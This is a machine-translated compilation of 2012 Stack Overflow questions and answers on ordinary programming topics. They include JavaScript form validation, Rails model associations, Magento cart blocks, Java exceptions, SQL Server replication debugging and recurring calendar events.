 display:block;
 width:400px;
 height:80px;
 border:1px solid;
 position:relative; 
 color:#a0a0a0;
 background-color:white; 
-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; 
 filter:alpha(opacity=0); 
 }
 <![endif]--> 
```

# javascript - 代码整合与复杂性

> ID：10148924
> 
> 赞同：2
> 
> 时间：2012-04-13T22:07:11.250
> 
> 标签：javascript

我有一些处理用户操作的模块——它们是控制模块。有 6 个，现在有 5 个，因为我将 2 个非常相似的合并到一个名为 Control 的模块中

我注意到的是，当我整合类似的代码时......它变得有点效率低下。例如，在 Control 中，我现在有一个额外的逻辑语句来确定程序流程。

```
if( this.type === 'signup' && !this.text_object.checkPattern( 'name' ) ) 
```

这个简单的行允许我将 ControlSignIn 和 ControlSignUp 结合起来，因为唯一的区别是检查 Sign Up 中没有 Sign In 的名称。

我可以以这种方式继续，我得到更复杂的代码，但我的代码占用空间更小。

在（复杂性和运行时间）与（代码足迹）之间存在权衡。

我猜这没关系，但我只是想确定一下。

作为一个例子`ControlTweet`，我也可以适应`Control.`

问题？

我应该将 ControlTweet 与 Control 合并吗？

一般来说，你在哪里画线，还是一个偏好问题？

**控制**

```
/**
 *Control - receives incoming requests for client use
 */

var Control = ( function () 
{
    var Control = function ( type )
    {
        this.TIME = 4000;
        this.type = type;
        this.form_element = document.getElementById( type ), 
        this.response_element = document.getElementById( type + '_response' );

        this.text_object = new TextValidator( this.form_element ),
        this.message_object = new Message( this.response_element ),
        this.effects_object= new Effects( this.response_element );
    };
    Control.prototype.invoke = function( ) 
    {
        if( Global.validate_input_on === 1 )
        {
            if( !this.text_object.checkEmpty() ) 
            {
                this.message_object.display( 'empty' );
                this.effects_object.fade( 'down', this.TIME );
                return false;
            }
            if( this.type === 'signup' && !this.text_object.checkPattern( 'name' ) ) 
            {
                this.message_object.display( 'name' );
                this.effects_object.fade( 'down', this.TIME );
                return false;
            }
            if( !this.text_object.checkPattern( 'email' ) ) 
            {
                this.message_object.display( 'email' );
                this.effects_object.fade( 'down', this.TIME );
                return false;
            }
            if( !this.text_object.checkPattern( 'pass' ) ) 
            {
                this.message_object.display( 'pass' );
                this.effects_object.fade( 'down', this.TIME );
                return false;
           }
        }
        var response_element = this.response_element;
        new Ajax().invoke( serializeArray( this.form_element ) + '&ajax_type=' + this.type + '_control', function( server_response_text ) { ajaxType( server_response_text, response_element, 'respond' ); } );
    };
    Control.in = function()
    {
        new Control( 'signin' ).invoke();
    };
    Control.up = function()
    {
        new Control( 'signup' ).invoke();
    };
    Control.out = function()
    {
        new Ajax().invoke( '&ajax_type=ControlSignOut', function( server_response_text ) { ajaxType( server_response_text, 0, 'simple' ); } );
    };
    Control.try = function()
    {
        new Ajax().invoke( '&ajax_type=ControlTryIt', function( server_response_text ) { ajaxType( server_response_text, 0, 'simple' ); } );
    };
    return Control;
} () ); 
```

**控制推文**

```
/**
 *    ControlTweet
 */

function interfaceTweet()
{
    var fill_element = document.getElementById( 'tweet_fill' ),
        form_element = document.getElementById( 'tweet' ),
        response_element = document.getElementById( 'tweet_response' );

    var text_object = new TextValidator( form_element ),
        message_object = new Message( response_element ),
        effects_object = new Effects( response_element );

    if( Global.validate_input_on === 1 )
    {
        if( !text_object.checkEmpty() ) 
        {
            message_object.display( 'empty' );
            effects_object.fade( 'down', 4000 );
            return;
        }

        if( !text_object.checkPattern( 'tweet' ) ) 
        {
            message_object.display( 'tweet' );
            effects_object.fade( 'down', 4000 );
            return;
        }
    }
    new Ajax().invoke( serializeArray( form_element ) + '&ajax_type=ControlTweet_add', function( server_response_text ) { ajaxType( server_response_text, response_element, 'tweet', fill_element ); } );
} 
```

**我最终使用的是：**

```
/**
 *Control - receives incoming requests for client use
 */

var Control = ( function () 
{
    var Control = function ( type )
    {
        this.TIME = 4000;
        this.type = type;

        this.form_element = document.getElementById( type ), 
        this.response_element = document.getElementById( type + '_response' );
        if( type === 'tweet' ) { this.fill_element = document.getElementById( type + '_fill' ); }

        this.text_object = new TextValidator( this.form_element ),
        this.message_object = new Message( this.response_element ),
        this.effects_object= new Effects( this.response_element );
    };
    Control.prototype.invoke = function( ) 
    {
        if( Global.validate_input_on === 1 )
        {
            if( !this.text_object.checkEmpty() ) 
            {
                this.message_object.display( 'empty' );
                this.effects_object.fade( 'down', this.TIME );
                return false;
            }
            switch( this.type )
            {
                case 'signin':
                    if( !this.text_object.checkPattern( 'email' ) ) 
                    {
                        this.message_object.display( 'email' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    if( !this.text_object.checkPattern( 'pass' ) ) 
                    {
                        this.message_object.display( 'pass' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    break;
                case 'signup':
                    if( !this.text_object.checkPattern( 'email' ) ) 
                    {
                        this.message_object.display( 'email' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    if( !this.text_object.checkPattern( 'name' ) ) 
                    {
                        this.message_object.display( 'name' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    if( !this.text_object.checkPattern( 'pass' ) ) 
                    {
                        this.message_object.display( 'pass' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    break;
                case 'tweet':
                    if( !this.text_object.checkPattern( 'tweet' ) ) 
                    {
                        this.message_object.display( 'tweet' );
                        this.effects_object.fade( 'down', this.TIME );
                        return false;
                    }
                    break;
                default:
            }
        }
        var response_element = this.response_element;
        if( this.type === 'tweet' ) { var fill_element = this.fill_element; }
        new Ajax().invoke( serializeArray( this.form_element ) + '&ajax_type=' + this.type + '_control', function( server_response_text ) { ajaxType( server_response_text, response_element, 'respond', fill_element ); } );
    };
    Control.tweet = function()
    {
        new Control( 'tweet' ).invoke();
    }
    Control.in = function()
    {
        new Control( 'signin' ).invoke();
    };
    Control.up = function()
    {
        new Control( 'signup' ).invoke();
    };
    Control.out = function()
    {
        new Ajax().invoke( '&ajax_type=ControlSignOut', function( server_response_text ) { ajaxType( server_response_text, 0, 'simple' ); } );
    };
    Control.try = function()
    {
        new Ajax().invoke( '&ajax_type=ControlTryIt', function( server_response_text ) { ajaxType( server_response_text, 0, 'simple' ); } );
    };
    Control.bookmarkDelete = function( event_pull )
    {
        event_pull.preventDefault();
        domBookmarkDelete( this );
        new Ajax().invoke( encodeURIComponent( this.name ) + "=" + encodeURIComponent( this.innerHTML ) + '&ajax_type=ControlBookmark_delete', function( ) { } );
    }
    return Control;
} () ); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:24:54.187

这是一个相当主观的问题，因为每个人在整合代码时都会有自己的个人偏好，而且它也是本地化的，因为它可能因项目而异。话虽如此，显然要画一条线，因为您不希望将所有内容合并为一个`main()`处理所有内容的庞大功能，然后再处理一些。

有两个编程经验法则可以帮助您：

1.  干燥（不要重复自己）
2.  过早的优化 === 邪恶

现在，DRY 原则指出——在合理的情况下——你应该将相似的代码组合成可重用的模块。这里的关键字是相似的代码，因为有时即使冒着重复代码的风险，拥有多个单独的模块也是有意义的。原因是您还必须考虑代码的维护和可读性，当您开始以 DRY 的名义整合不同的模块时，它可能成为可读性的噩梦。

我还提到过早优化，因为您提出了占用空间小而不是代码复杂性的想法。我建议您忘记这一点，并将代码足迹留给压缩/gzipping。

为了最终回答您的问题，我会亲自组合这些模块。但是，这最终应该是您的决定，因为您是必须维护该代码的人。**请记住正确评论和记录所有内容，这样当您在几个月后重新访问时不会迷失在黑暗中。**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:22:51.790

代码应该产生你想要的结果，可读，可测试，并且无论语言如何都具有**所需的性能。**

您试图在主观的“可读”和不必要的“绝对最快”之间找到权衡。我想说 - 任何对**你**来说可读的东西都是好的，除非你在满足**所需性能**方面遇到问题（必须首先有测量/目标......）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-14T00:34:35.383

答案是继承。取出公共部分并将它们放在父类中，然后继承它们。为不同的调用放入一堆 if 语句有点像继承黑客。一旦我学会了如何在 JS 中执行此操作，我将发布代码。

# android - iOS SDK 中的 NSURLProtocol 的 Android 等效项是什么？

> ID：10148926
> 
> 赞同：8
> 
> 时间：2012-04-13T22:07:16.050
> 
> 标签：android, apache-httpcomponents

我正在开发一个使用第三方 jar 的 Android 应用程序。我想监视并可能修改该库发出的 HTTP 请求。在 iOS 下，我可以通过注册一个自定义`NSURLProtocol`类来做到这一点，该类可以检查和操作应用程序进程中发生的任何网络请求。

Android有类似的东西吗？我承认，我是 Android 开发的新手，但一直无法找到解决此问题的有效方法。

我没有这个jar的源码，也不能依赖反编译。

我探索过的几件事：

*   **安卓内容提供者。**不起作用，因为解决方案必须支持“http://”请求，而不是“content://”请求。
*   **创建自定义`org.apache.http.impl.client.DefaultHTTPClient`类。**（这是用于我所追求的请求的底层网络类。）似乎这不起作用，因为Android已经缓存了这个类的系统版本并且总是加载它而不是我的，即使它设置得更高加载顺序。

我已经很好地查看了 Apache HTTP 库，虽然它有各种各样的东西`HttpRequestInterceptor`，比如`HttpResponseInterceptor`类，但这对我没有多大好处，因为该库实例化了一个`DefaultHTTPClient`实例并将其分配给私有方法中的私有成员我无法访问。

我的最终目标是监控和更改这些请求以进行单元测试。我不希望发出真正的请求；我想提供一个模拟响应。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:36:38.517

不幸的是，您不走运：Android 应用程序没有这种应用程序范围的拦截框架。

我的建议是设置一个代理来拦截请求并提供您的模拟响应。

# ruby-on-rails - 创建新关系，以便只有某些用户可以编辑文档

> ID：10148927
> 
> 赞同：1
> 
> 时间：2012-04-13T22:07:16.430
> 
> 标签：ruby-on-rails, ruby-on-rails-3, associations

我有一个模型“Trip”，我希望只能让“组”中的某些用户创建“评论”。

当我第一次创建旅行模型时，我将它设置为只有一个用户可以编辑它。现在，我希望能够邀请其他用户来编辑它。现在让我绊倒（双关语）的部分是我同时拥有`trip belong_to :user`（创建它的用户）和`trip has_many :users, :through => :group`.

问题：

1.  这是每个 Rails 约定允许的吗？
2.  根据我的模型，组将同时具有 user_id 和 trip_id。这是解决这个问题的最佳方法吗？也就是说，数据库中是否应该为我邀请加入组的每个用户创建一条新记录？

谢谢。

用户.rb

```
class User < ActiveRecord::Base
  has_many :trips, :through => :groups
  has_many :trips, :dependent => :destroy
  has_many :groups
  has_many :comments, :dependent => :destroy
end 
```

组.rb

```
class Group < ActiveRecord::Base
  belongs_to :trip
  belongs_to :user
end 
```

行程.rb

```
class Trip < ActiveRecord::Base
  belongs_to :user
  belongs_to :traveldeal
  has_many :groups
  has_many :users, :through => :groups
end 
```

评论.rb

```
class Comment < ActiveRecord::Base
  belongs_to :user
  belongs_to :commentable, :polymorphic => true
end 
```

查看 (show.html.erb)

```
<% unless @user.trips.empty? %>
  <% @user.trips.each do |trip| %>
    <!-- Content here -->
  <% end %>
<% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T00:26:28.377

通常`Rails`的约定是调用`Group`模型类似于`TripPerson`指定它要连接的两个表，但这些连接表是关系数据库的自然副产品。您必须继续`Group`为每个受邀参加旅行的人创建一个新对象。

# magento - 将magento购物车块加载到下拉面板

> ID：10148930
> 
> 赞同：0
> 
> 时间：2012-04-13T22:07:52.667
> 
> 标签：magento, jquery, css, joomla1.5, shopping-cart

任何人都可以帮我将magento购物车块加载到下拉框中。更具体地说，模块标题或菜单应显示“我的篮子”之类的内容，并且“我的篮子”下方应显示购物车中商品数量的消息。当用户悬停菜单时，下拉框应显示 cart/sidebar.phtml 的内容。有人可以建议我如何实现这一点吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T09:10:32.323

查看 Fatdivision AJAX 快速购物车文章。

*   [为您的 Magento 主题创建 AJAX 快速购物车](http://fastdivision.com/2011/11/23/diy-magento-create-an-ajax-quick-cart-for-your-magento-theme/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T00:04:10.723

我正在为我正在开发的网站执行此操作。不幸的是，我不得不通过一个静态块来做到这一点......但它似乎没有任何问题。这对我有用，玩一玩，看看你怎么样。

CSS 非常简单，它们是显示和隐藏下拉列表本身的关键。

**CSS**

```
// this is the panel where the cart is displayed
DIV#cart-panel {
    width:100px; //arbitary width
    position:absolute; // need this so that it doesn't interfere with the layout
    display:none; // hides the block
    z-index:200; // makes it way it in front of other content
}

#cartBtn:hover #cart-panel { display: block; } // basically, when you hover over the cartBtn, the cart-panel displays 
```

**静态块包含**

```
<li id="myCartBtn">
    <a href="{{store url=checkout/cart}}" rel="cart">My Cart</a>
    {{block type="checkout/cart_sidebar" template="checkout/cart/sidebar.phtml"}}
</li> 
```

然后在我的 sidebar.phtml 中，我只需确保其中有一个 id="cart-panel" 的 div 围绕购物车本身，而不是`<div class="block block-cart">`

```
<?php if ($this->getIsNeedToDisplaySideBar()): ?>
<div id="cart-panel">
...
</div>
<?php endif; ?> 
```

然后，最后，我将静态块放入我需要的模板中

# java - 一种计算数组自相关函数的方法

> ID：10148931
> 
> 赞同：2
> 
> 时间：2012-04-13T22:07:52.780
> 
> 标签：java, statistics

我需要一个真正快速的自相关算法。最好是在java中。到目前为止，已经使用了 Apache Commons PearsonsCorrelation 类，但它太慢了。也听说过 Wiener Chintschin Theorem trieng this out atm。我对 YIN 自相关算法很感兴趣。但是还没有找到任何源实现。

我感谢您的帮助..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:55:56.477

已经很晚了，但是stackoverflow中的[这个链接可能会对你有所帮助。](https://stackoverflow.com/questions/12239096/computing-autocorrelation-with-fft-using-jtransforms-library)在接受的答案中，使用了蛮力和 fft。**蛮力是 O(n^2)，FFT 是 O(n.logn)**

# java - 一个 if 语句中的多个异常处理

> ID：10148947
> 
> 赞同：2
> 
> 时间：2012-04-13T22:09:52.460
> 
> 标签：java, exception-handling

我在抛出和捕获异常时遇到了麻烦。

这是 assignSeat() 的代码，assignSeat 在另一个类的 try 块中调用。

```
void assignSeat(String passengerName, int x, int y) throws SeatOccupiedException, InvalidPassengerNameException
{
    Seat tSeat = airplane.getSeat(x,y);
    if (tSeat!=null)
    {
        if (passengerName.isEmpty() || !passengerName.matches("[a-zA-Z]+"))
        {
            throw new InvalidPassengerNameException();
        }
//excluded else if
    else if (foundPassenger(passengerName))
        {
                    airplane.seatList.get(airplane.seatNumber(passengerName)).unOccupy();   
                    tSeat.occupy();
                    for (int i = 0; i<passengers.size();i++)
                        if (passengers.get(i).getName().equals(passengerName))
                            passengers.get(i).changeSeat(tSeat.getSeatName());
        }
        else if (!tSeat.occupied)
        {
            tSeat.occupy();
            addPassenger(passengerName, tSeat.getSeatName());
        }
        else if (tSeat.occupied)
        {
            throw new SeatOccupiedException();
        }
    } 
```

这是调用 assignSeat() 并且在另一个类中的代码（我不会复制整个类以使其看起来更清晰）

```
if (afComp.currentAF != null)
            {
                try
                {
                    afComp.currentAF.assignSeat(nameField.getText(), x, y); //<-Problem here, "Unhandled exception type SeatOccupiedException"
                }
                catch (SeatOccupiedException exception) //<-Problem here, "Unreachable catch block, This exception is never thrown from the try statement body"
                {

                }
                catch(InvalidPassengerNameException exception) //<-No problems.
                {

                }
            } 
```

try 块有什么问题？为什么它不会抛出 SeatOccupiedException？

异常类：

占座：

```
package a2;

public class SeatOccupiedException extends Exception
{
    public SeatOccupiedException(){}
} 
```

无效乘客姓名：

```
package a2;

public class InvalidPassengerNameException extends Exception
{
    public InvalidPassengerNameException() {}
} 
```

我的每个课程都在包 a2 中

调用 assignSeat 的类的导入

```
package a2;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseListener;
import java.awt.event.MouseMotionListener;
import java.awt.event.MouseEvent;
import java.awt.BorderLayout;
import javax.swing.*;
import javax.swing.event.*; 
```

具有 assignSeat 的类的导入

```
package a2;
import java.util.ArrayList; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:15:24.270

最有可能的是，您`SeatOccupiedException`在两个不同的包中有两个类，您的方法从一个包中抛出该类，而您的代码捕获另一个类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:48:57.423

更改逻辑并简化您的陈述：

```
 if ( tSeat.occupied ) {
        throw new SeatOccupiedException();
    }

    if ( /* bad passenger name */ ) {
        throw new InvalidPassengerNameException();
    }

    if ( /* passenger does not exist */ ) {
        throw new PassengerNotFoundException();
    }

    /* assign Seat here */ 
```

# workflow-foundation-4 - 调试重新托管的工作流

> ID：10148950
> 
> 赞同：0
> 
> 时间：2012-04-13T22:10:03.557
> 
> 标签：workflow-foundation-4

我正在使用动态活动并从 xaml 加载工作流。
此 xaml 文件是使用重新托管的 WF 设计器编写的。
有没有办法调试这个并逐步完成活动？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T09:39:51.237

[Visual Workflow Tracking](http://msdn.microsoft.com/en-us/library/ee624139.aspx) WF4 示例应用程序使用重新托管的 WorkflowDesigner 并逐步完成活动。不完全是您正在寻找的东西，但它应该可以帮助您入门。

# matlab - 显示嵌套元胞数组中的所有元素（带有字符条目）

> ID：10148955
> 
> 赞同：0
> 
> 时间：2012-04-13T22:10:32.633
> 
> 标签：matlab, cell-array

我有以下内容：

```
a = 

{1x1 cell}    {1x1 cell}    {1x1 cell}    {1x1 cell} 
```

在哪里：

```
a{:}

ans = 

'a'

ans = 

'a'

ans = 

'c'

ans = 

'a' 
```

我想要角色：`a a c a`

因为我需要使用字符打印`fprintf`

`fprintf`不接受`a{:}`

如果我这样做`a{1}{:}`只会考虑第一个字符

如何解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T23:17:44.273

如果你只需要字符向量'aaca'，你可以使用这个：

```
a = {{'a'}, {'a'}, {'c'}, {'a'}};

a_CharVector = cellfun(@(x) char(x), a); 
```

如果你想要字符向量'aaca'，你可以使用`regexprep`添加空格：

```
a_CharVectorWithSpaces = regexprep((cellfun(@(x) char(x), a)), '(.)', '$1 '); 
```

要使用空格和换行符打印 aaca，您可以使用以下命令：

```
fprintf([ regexprep((cellfun(@(x) char(x), a)), '(.)', '$1 '), '\n' ]); 
```

**编辑：删除了不必要的匿名函数。`@(x)`在这种情况下是不必要的。**

要获得字符向量 'aaca' 这有效：

```
a_CharVector = cellfun(@char, a); 
```

要获取字符向量 'aaca '，您可以使用以下命令：

```
a_CharVectorWithSpaces = regexprep((cellfun(@char, a)), '(.)', '$1 '); 
```

用换行符打印 aaca：

```
fprintf([ regexprep((cellfun(@char, a)), '(.)', '$1 '), '\n' ]); 
```

# php - 在 PHP 变量上重复并输入一个单词

> ID：10148956
> 
> 赞同：0
> 
> 时间：2012-04-13T22:11:01.573
> 
> 标签：php, string

```
$xcatname = 'Business';
$repeatmaincitiescat = 'London, Paris, New York';

$repeatmaincitiescat = str_replace(',', ' ' . $xcatname . ',', $repeatmaincitiescat).(empty($repeatmaincitiessubcat)?'':""); 
```

以上代码给出了这个结果：**伦敦商业、巴黎商业、纽约商业**

但是，我想要这种类型的输出，

**在伦敦做生意、在巴黎做生意、在纽约做生意**

我尝试了一些更改，但结果是错误的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:16:16.480

一个简单的映射呢？

```
$xcatname = 'Business in %s';
$repeatmaincitiescat = 'London, Paris, New York';
$separator = ', ';
$repeatmaincitiescat = implode(
    $separator,
    array_map(function($v) use ($xcatname) {
            return sprintf($xcatname, $v);
        },
        explode($separator, $repeatmaincitiescat))
);

echo $repeatmaincitiescat; 
```

输出：

```
Business in London, Business in Paris, Business in New York 
```

这里有一个 PHP 5.2 变体：

```
$xcatname = 'Business in %s';
$repeatmaincitiescat = 'London, Paris, New York';

$new = new MaskRepeat($repeatmaincitiescat, ', ', $xcatname);
echo $new; # Business in London, Business in Paris, Business in New York

class MaskRepeat {
    private $str;
    public function __construct($string, $separator, $mask) {
        $array = explode($separator, $string);
        foreach($array as &$value) {
            $value = sprintf($mask, $value);
        }
        $this->str = implode($separator, $array);
    }
    public function __toString() {return $this->str;}
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:58:09.197

hakre 提出的替代方案是使用正则表达式。它与您的代码一样接近，您想要实现的目标无法通过简单的替换来完成。

所以，你可以做（​​尽可能接近你所做的）：

```
<?php
$xcatname = 'Business';
$repeatmaincitiescat = 'London, Paris, New York';

$pattern = '/([^,]+)((,\s*)*)/';

function replace_match($matches) {
    global $xcatname;
    return $xcatname . ' in ' . $matches[1] . $matches[2];
}

$processed = preg_replace_callback($pattern, "replace_match", $repeatmaincitiescat);
// or simpler:
// $processed = preg_replace($pattern, $xcatname . " in  $1$2", $repeatmaincitiescat);
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T23:15:00.283

$xcatname = '业务范围'; $repeatmaincitiescat = '伦敦、巴黎、纽约';

$repeatmaincitiescat = "$xcatname ".str_replace(',',','.$xcatname.'', ​​$repeatmaincitiescat).(empty($repeatmaincitiessubcat)?'':"");

```
echo $repeatmaincitiescat ; 
```

# sql-server - 如何找到下一个 SQL Server 复制语句

> ID：10148957
> 
> 赞同：0
> 
> 时间：2012-04-13T22:11:01.713
> 
> 标签：sql-server, sql-server-2008-r2, replication

我正在调试我的数据库，我发现在删除语句上复制失败。

我查看源表和目标表，它们是相同的。所以有人从源中删除了一行，然后将其放回原处。（删除失败是因为 FK 引用了一些我不想级联删除的手动数据。）

有没有办法找出它试图删除的行的PK？

（所有复制监视器都会告诉我导致删除语句失败的 FK 的名称。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:55:25.057

有几种方法。我会告诉你一个简单的（因为我很懒）。跟踪您的订阅者是否执行不成功的存储过程。你应该得到一个名为 sp_MSdel_table （其中 table 是你的表的名称）之类的东西的命中。该过程的参数将是它试图删除的记录的主键。

简单的方法二是修改前面方法中确定的存储过程，不要对丢失的行生气（毕竟，它只是要删除它，所以它现在丢失的事实并不是*什么*大问题）。您可能还有其他不收敛的问题，但至少您可以让您的命令再次流动。（编辑：刚刚注意到您的问题的原因。我建议在订阅者处不要有 FK 约束，因为应该在发布者处处理任何引用完整性。当 SQL 不必检查时，我会让您的复制更快每次执行适用的插入、更新或删除时）。

第一个困难的方法是查看复制监视器中的错误，并注意指定了事务 id 和序列号。然后，您使用分发数据库中的存储过程来获取正在执行的命令的文本。

第二个困难的方法是使用 tablediff.exe 来区分表，比如 RedGate 的 SQLCompare，或者在链接服务器上滚动你自己的连接以显示差异。把它放在你的后口袋里，以防万一上面提到的其他一次一行的方法不适合你。我对这类事情的门槛大约是三。YMMV。

# javascript - 我如何测试以查看是否 内容在显示之前已更改

> ID：10148959
> 
> 赞同：0
> 
> 时间：2012-04-13T22:11:21.213
> 
> 标签：javascript, jquery, html, ajax

我有一个 ID 为“responsecontainer”的 div，我想加载一个页面。如果 DIV 的内容已更改，则更新 DIV，否则保持不变。

这是我的代码，它不起作用；

```
<script>
$(document).ready(function () {
    $("#responsecontainer").load("qr.asp");
    var refreshId = setInterval(function () {
        $.get("qr.asp?randval=" + Math.random(), function (result) {
            var newContent = $('.result').html(result);
            if (newContent != $("#responsecontainer")) {
                $("#responsecontainer").html(result);
            };
        });
    }, 5000);
    $.ajaxSetup({
        cache: false
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:24:41.397

我不会依赖`.html()`表示进行字符串比较。

浏览器决定 HTML 字符串应该如何呈现，如果浏览器决定它应该以不同的方式显示一次，开发人员将无法进行任何控制。

您应该有一个可供每个间隔调用访问的变量，并在旧响应和新响应之间进行字符串比较。

```
$(document).ready(function () {

    var prev_response;

    $("#responsecontainer").load("qr.asp", function(resp) {
        prev_response = resp;
    });

    var refreshId = setInterval(function () {
        $.get("qr.asp?randval=" + Math.random(), function (result) {

            if (prev_response !== result) {
                prev_response = result;
                $("#responsecontainer").html(result);
            }
        });
    }, 5000);
    $.ajaxSetup({
        cache: false
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:20:07.743

这个：

```
if (newContent != $("#responsecontainer")) { 
```

应该是这样的：

```
if (newContent != $("#responsecontainer").html()) { 
```

# ruby-on-rails - 日历中的重复事件 - Rails

> ID：10148960
> 
> 赞同：28
> 
> 时间：2012-04-13T22:11:28.833
> 
> 标签：ruby-on-rails, ruby-on-rails-3, calendar, fullcalendar, recurring-events

我正在寻找对重复事件建模的最佳方法。我正在使用 fullcalendar 来显示事件。但我想最好在 Rails 后端处理重复发生的事件。

我已经查看了其他问题和现有的示例代码，但我没有找到任何合适的东西。

它的行为应该类似于谷歌日历。所以应该可以**删除/修改**重复事件系列的单个事件。但是将事件系列的所有事件保存在数据库中似乎效率低下。此外，应该可以创建单个事件而不会重复发生。

什么是好的模型架构？

我的事件模型现在看起来像这样（*没有附加属性*）：

```
# Table name: events
#
#  id              :integer         not null, primary key
#  employee_id     :integer
#  created_at      :datetime
#  updated_at      :datetime
#  starts_at       :datetime
#  ends_at         :datetime
#

class Event < ActiveRecord::Base
  attr_accessible :starts_at, :ends_at
end 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-04-22T08:36:04.657

这是我将如何建模。我没有太多使用 Google 日历，因此我将功能基于[iCal](http://support.apple.com/kb/HT2513)的重复事件。

所有模型都应该具有通常的 id、created_at、updated_at 属性。列出的是自定义属性。如果该属性是另一个模型，您将实现它的关联，例如`has_one`or `belongs_to`。

*   `RecurrencePeriod`
    *   `Event`base_event *#`has_one :base_event, :class_name'Event'`*
    *   `Time`end_date *# 可能为 nil，如果它永远重复*
    *   `WeeklyRecurrence`复发*#`has_one :recurrence, :as=>:recurrence`*
    *   `Array[OccurrenceOverride]`覆盖*#`has_many :overrides, :class_name=>'OccurrenceOverride'`*

`RecurrencePeriod`开始于其 base_event 开始的日期。另外，我假设 an`Event`的 employee_id 是指创建该事件的员工。A`RecurrencePeriod`也将属于创建 base_event 的员工。

该模型取决于您希望能够灵活地指定重复次数。您是要支持“每周二和周四，从上午 10 点到上午 11 点，从下午 2 点到下午 3 点”还是只支持“每周重复一次”？这是一个只支持“每周重复”、“每两周重复”等的模型；如果需要，您可以扩展它。

*   `WeeklyRecurrence`
    *   `Integer`week_between_recurrences
    *   `RecurrencePeriod`复发周期*#`belongs_to :recurrence, :polymorphic=>true`*

我在这里使用[多态关联](http://guides.rubyonrails.org/association_basics.html#polymorphic-associations)，因为我认为如果你想要不止一种类型的重复，它们可能很有用，比如`WeeklyRecurrence`和`DailyRecurrence`。但我不确定它们是否是建模的正确方法，所以如果结果不是，只需使用`has_one :weekly_recurrence`and`belongs_to :recurrence_period`代替。

[Ice cube](http://seejohnrun.github.com/ice_cube/)库似乎对计算重复率很有用。如果`WeeklyRecurrence`上面的功能不够强大，您可能只想`Schedule`在模型中存储一个冰块对象，替换`WeeklyRecurrence`. 要将`Schedule`对象存储在模型中，将其保存为属性“schedule”，放入`serialize :schedule`模型定义，并在数据库中生成文本列“schedule”。

`OccurrenceOverride`处理正在编辑的重复事件的单个实例的情况。

*   `OccurrenceOverride`
    *   `RecurrencePeriod`重复周期到覆盖*#`belongs_to :recurrence_period_to_override, :class_name=>'RecurrencePeriod'`*
    *   `Time`original_start_time *# 唯一标识要替换该 RecurrencePeriod 中的哪个重复*
    *   `Event`替换事件*# `has_one :replacement_event, :class_name=>'Event'`; 可能为零，如果该重复被删除而不是编辑*

与其单独存储每个事件的发生，不如在需要在视图中显示它们时临时生成它们。在`RecurrencePeriod`中，创建一个`generate_events_in_range(start_date, end_date)`生成`Event`s 的方法，而不是保存在数据库中，而只是传递给视图以便它可以显示它们。

当用户编辑重复时，他们应该可以选择修改所有事件、所有未来事件或仅修改该事件。如果他们修改了所有事件，请修改`RecurrencePeriod`'base_event. 如果他们修改了所有未来的事件，请使用您应该实施的方法，在特定日期的两侧`RecurrencePeriod`将自身拆分为两个s，然后将更改保存到第二个期间。如果他们仅修改该事件，则为他们覆盖的时间`RecurrencePeriod`创建一个，并将更改保存到覆盖的 replacement_event。`OccurrenceOverride`

当用户说某个事件现在应该在可预见的未来每两周重复一次时，您应该创建一个新`RecurrencePeriod`事件，该事件作为 base_event 和一个 nil end_date。它的重复周期应该是一个新`WeeklyRecurrence`的，weeks_between_recurrence=2，它应该没有`OccurrenceOverride`s。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-01-30T01:18:00.150

就我而言，我做了这样的事情：

```
# Holds most of my event's data; name, description, price ...
class Event < ActiveRecord::Base
  has_many :schedules
  has_many :occurrences
  attr_accessible :started_at, :expired_at # expired_at is optional
end

# Holds my schedule object
class Schedule < ActiveRecord::Base
  belongs_to :event
  attr_accessible :ice_cube_rule # which returns my deserialized ice_cube object
end

# Holds generated or manually created event occurrences 
class Occurrence < ActiveRecord::Base
  belongs_to :event
  attr_accessible :started_at, :expired_at
  attr_accessible :generated # helps me tell which occurrences are out of an ice_cube generated serie
  attr_accessible :canceled_at
end 
```

从那里，我使用[ice_cube](http://seejohnrun.github.com/ice_cube/)来管理出现次数计算并将结果存储在出现次数表中。我首先尝试在不使用 Occurrence 模型的情况下工作，但无论规则引擎多么先进，总会有例外情况，因此将出现次数存储在它们自己的模型中会给您带来灵活性。

拥有一个 Occurrence 模型可以更轻松地在日历上显示事件或使用日期搜索过滤器，因为您只需要查询事件然后显示相关事件的数据，而不是收集给定日期范围内的所有事件然后拥有过滤掉时间表不匹配的事件。

您还可以将事件发生标记为已取消或修改它（将生成的属性设置为 false，以便在编辑 ice_cube 时间表时不会清理它......或您的业务需要的任何东西）

